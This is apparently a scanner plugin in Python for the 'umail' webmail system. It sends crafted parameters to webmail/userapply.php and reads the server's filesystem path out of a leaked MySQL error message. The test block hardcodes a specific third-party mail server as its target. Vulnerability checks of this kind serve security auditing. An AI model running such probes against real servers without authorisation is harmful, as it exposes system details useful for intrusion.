#!/usr/bin/env python
# -*- coding: utf-8 -*-
#Refer http://www.unhonker.com/bug/1513.html
import re

def assign(service, arg):
    if service == "umail":
        return True, arg

def audit(arg):
    url = arg
    code, head, res, errcode, _ = curl.curl(url + 'webmail/userapply.php?execadd=333&DomainID=111')
    if code == 200:
        r = re.search('MySQL result resource in <b>([^<]+)</b>',res)
        if r:
            security_info(r.group(1))

if __name__ == '__main__':
    from dummy import *
    audit(assign('umail', 'http://mail.bcicc.com/')[1])